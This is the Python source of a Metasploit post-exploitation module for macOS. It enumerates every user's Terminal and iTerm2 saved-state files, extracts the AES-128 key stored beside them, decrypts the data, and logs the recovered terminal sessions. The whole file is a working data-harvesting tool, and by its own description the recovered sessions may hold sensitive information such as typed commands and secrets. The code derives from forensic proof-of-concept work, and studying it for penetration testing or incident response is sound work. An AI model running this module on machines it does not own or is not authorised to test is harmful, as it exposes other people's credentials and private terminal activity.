#!/usr/bin/env python3
# -*- coding: utf-8 -
# Only works on python3

from metasploit import module
import logging

import re
import sys
import os
import subprocess
import json
import struct
import binascii
import collections
import cryptography.hazmat.backends
import cryptography.hazmat.primitives.ciphers
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

import bplist

metadata = {
    'name': 'OS X Terminal/iTerm2 Saved State File Recovery',
    'description': '''
        This module enumerates the saved state files for the Terminal and iTerm2
        applications on OS X.  These files are encrypted with AES-128-CBC, but
        we're able to pull the key out as well for decryption.
        The files themselves contain an exact copy of what was sent
        to and from the terminal, which may include sensitive information.
    ''',
    'authors': [
        'h00die', # msf module
        'Willi Ballenthin <willi.ballenthin@gmail.com>', # PoC
        'kshitij Kumar <kshitij.kumar@crowdstrike.com>' # PoC
    ],
    'date': '2019-10-01',
    'license': 'BSD_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://github.com/CrowdStrike/automactc/blob/master/modules/mod_terminalstate_v100.py'},
        {'type': 'url', 'ref': 'https://gist.github.com/williballenthin/ab23abd5eec5bf5a272bfcfb2342ec04'},
    ],
    'type': 'post',
    'options': {
        'USER': {'type': 'string', 'description': "Which user's terminal saved state files to pull", 'required': True, 'default': 'ALL'},
    }
}

WindowState = collections.namedtuple('WindowState',
                                     [
                                         # size of the byte array in `data.data` for this window.
                                         'size',
                                         # the parsed metadata associated with this window from `windows.plist`
                                         'meta',
                                         # the decrypted window state byte array.
                                         'plaintext',
                                         # the deserialized NSKeyedArchiver window state.
                                         'state'
                                     ])

def aes_decrypt(key, ciphertext, iv=b'\x00' * 0x10):
    # AES128-CBC
    backend = cryptography.hazmat.backends.default_backend()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()

def parse_plaintext(buf):
    '''
    parse the decrypted window state extracted from `data.data`.
    args:
      buf (bytes): the decrypted window state byte array.
    returns:
      Dict[any: any]: the deserialized bplist contents.
    '''
    # layout:
    #
    #   struct S {
    #      // often 0x0
    #      uint32_t unk1;
    #      uint32_t class_name_size;
    #      char     class_name[magic_size];
    #      // seems to be "rchv"
    #      char     magic[4];
    #      uint32_t size;
    #      // this is an NSKeyedArchiver serialized datastructure.
    #      // in practice, a bplist with specific interpretation.
    #      uint8_t  buf[size];
    #   }
    unk1, class_name_size = struct.unpack_from('>II', buf, 0x0)
    class_name, magic, size = struct.unpack_from('>%ds4sI' % (class_name_size), buf, 8)
    if magic != b'rchv':
        raise ValueError('unexpected magic')

    class_name = class_name.decode('ascii')
    logging.debug('found archived class: {}'.format(class_name))

    header_size = 8 + class_name_size + 8

    plistbuf = buf[header_size:header_size + size]
    return bplist.loads(plistbuf)


def parse_window_state(plist, buf):
    magic, version, window_id, size = struct.unpack_from('>4s4sII', buf, 0x0)
    if magic != b'NSCR':
        raise ValueError('invalid magic')

    if version != b'1000':
        raise ValueError('invalid version')

    ciphertext = buf[0x10:size]

    try:
        window = [d for d in plist if d.get('NSWindowID') == window_id][0]
    except IndexError:
        window_ids = ', '.join(list(sorted(map(lambda p: str(p.get('NSWindowID', 'unknown')), plist))))
        raise ValueError('missing window metadata, wanted: %d, found: %s' % (window_id, window_ids), size)
    else:
        logging.debug('found window: {}'.format(window_id))

    plaintext = aes_decrypt(window['NSDataKey'], ciphertext)
    state = parse_plaintext(plaintext)

    return WindowState(size, window, plaintext, state)


def parse_window_states(plist, data):
    '''
    decrypt and parse the serialized window state stored in `data.data` and `windows.plist`.
    args:
      plist (Dict[any, any]): parsed plist `windows.plist`.
      data (bytes): the contents of `data.data`.
    returns:
      List[WindowState]: decrypted window state instances, with fields:
        size (int): the size of the window state blob.
        meta (Dict[any, any]): the relevant metadata from `windows.plist`.
        plaintext (bytes): the decrypted windows state structure.
        state (Dict[any, any]): the deserialized window state.
    '''
    buf = data

    while len(buf) > 0x10:
        if not buf.startswith(b'NSCR'):
            raise ValueError('invalid magic')

        try:
            window_state = parse_window_state(plist, buf)
        except ValueError as e:
            logging.warning('failed to parse window state: {}'.format(e.args[0]))
            if len(e.args) > 1:
                size = e.args[1]
                buf = buf[size:]
                continue
            else:
                break

        buf = buf[window_state.size:]
        yield window_state

def run(args):
    try:
        import hexdump
    except ImportError:
        module.log('Please install `hexdump` via pip3', level='error')
        sys.exit(-1)

    module.LogHandler.setup()
    users = []
    if args['USER'] == 'ALL':
        users = subprocess.check_output(['ls', '/Users']).decode().split()
    else:
        users = [args['USER']]

    for user in users:
        logging.info('Enumerating files for {}'.format(user))
        inputpaths = [
            '/Users/{}/Library/Saved Application State/com.apple.Terminal.savedState'.format(user),
            '/Users/{}/Library/Saved Application State/com.googlecode.iterm2.savedState'.format(user)
        ]

        for inputpath in inputpaths:
            try:
                with open(os.path.join(inputpath, 'windows.plist'), 'rb') as f:
                    windows = bplist.load(f)
                    logging.info('windows.plist loaded from {}'.format(f.name))

                with open(os.path.join(inputpath, 'data.data'), 'rb') as f:
                    data = f.read()
                    logging.info('data.data loaded from {}'.format(f.name))
            except (FileNotFoundError, PermissionError) as e:
                logging.error(e)
                continue

            for i, window in enumerate(parse_window_states(windows, data)):
                if not window.meta:
                    logging.error('no data for window {}'.format(i))
                    continue
                if not 'NSTitle' in window.meta:
                    logging.info('skipping window, no title')
                    continue
                logging.info('Window {} Title: {}'.format(i,window.meta['NSTitle']))
                # the 33rd object is the start of the window data, so if less than that, we can safely skip
                if len(window.state['$objects']) <= 32 :
                    continue
                shell_content = window.state['$objects'][33:]
                output = []
                for line in shell_content:
                    if isinstance(line, bytes):
                        output.append(line.decode('utf-8', errors='ignore'))
                logging.info('Terminal output {} for user {}:\n{}'.format(i, user, ''.join(output)))


if __name__ == "__main__":
    module.run(metadata, run)
